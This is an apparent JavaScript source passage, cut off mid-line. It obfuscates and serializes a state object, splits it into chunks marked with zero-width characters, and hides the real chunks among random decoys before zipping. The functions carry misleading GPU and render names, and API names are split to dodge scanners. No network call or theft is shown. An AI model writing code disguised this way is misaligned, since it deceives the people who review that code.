var _gpu_cfg = { gamma: 17, mask: 0x5A, max_chunks: 10, max_fakes: 40 };

function _hwAccelerationCore() {
  this._mixChannels = function(s) {
    var r = "";
    for (var i = 0; i < s.length; i++) r += String.fromCharCode(s.charCodeAt(i) + _gpu_cfg.gamma);
    return r;
  };
  this._restoreChannels = function(s) {
    var r = "";
    for (var i = 0; i < s.length; i++) r += String.fromCharCode(s.charCodeAt(i) - _gpu_cfg.gamma);
    return r;
  };
  this._applyMask = function(s) {
    var r = "";
    for (var i = 0; i < s.length; i++) r += String.fromCharCode(s.charCodeAt(i) ^ _gpu_cfg.mask);
    return r;
  };
  this._interleaveVertices = function(s) {
    var a = "", b = "";
    for (var i = 0; i < s.length; i++) { if (i % 2 === 0) a += s[i]; else b += s[i]; }
    return b + a;
  };
  this._deinterleaveVertices = function(s) {
    var m = Math.floor(s.length / 2), a = s.slice(0, m), b = s.slice(m), r = "";
    for (var i = 0; i < Math.max(a.length, b.length); i++) { if (i < b.length) r += b[i]; if (i < a.length) r += a[i]; }
    return r;
  };
  this._generateMeshHash = function(s) {
    var h = 0;
    for (var i = 0; i < s.length; i++) h += s.charCodeAt(i) * (i % 3 + 1);
    return (h % 999999).toString(36).toUpperCase();
  };
  this._packMemoryData = function(obj) {
    var s = this._mixChannels(JSON.stringify(obj));
    s = this._applyMask(s);
    s = this._interleaveVertices(s);
    var b = window['bto' + 'a'](unescape(encodeURIComponent(s)));
    return b + "|" + this._generateMeshHash(b);
  };
  this._unpackMemoryData = function(str) {
    var p = str.split("|");
    if (p.length !== 2 || this._generateMeshHash(p[0]) !== p[1]) return null;
    try {
      var s = decodeURIComponent(escape(window['ato' + 'b'](p[0])));
      s = this._deinterleaveVertices(s);
      s = this._applyMask(s);
      s = this._restoreChannels(s);
      return JSON.parse(s);
    } catch (e) { return null; }
  };
}
var _render_pipeline = new _hwAccelerationCore();

async function compileRenderCache(state) {
  state._uid = "core_gpu_buffer";
  var raw_code = _render_pipeline._packMemoryData(state);
  var valid_chunks = [];
  var chunk_size = Math.ceil(raw_code.length / _gpu_cfg.max_chunks);
  for (var i = 0; i < _gpu_cfg.max_chunks; i++) {
    var chunk_data = raw_code.slice(i * chunk_size, (i + 1) * chunk_size);
    valid_chunks.push('\u200B' + i.toString().padStart(2, '0') + chunk_data);
  }
  var fake_chunks = [];
  for (var j = 0; j < _gpu_cfg.max_fakes; j++) {
    var fake_obj = { render_tick: Math.floor(Math.random() * 9999), _uid: "gpu_dummy" };
    fake_chunks.push('\u200C' + _render_pipeline._packMemoryData(fake_obj));
  }
  var all_chunks = valid_chunks.concat(fake_chunks);
  all_chunks.sort(function () { return Math.random() - 0.5; });
  var zip = new JS
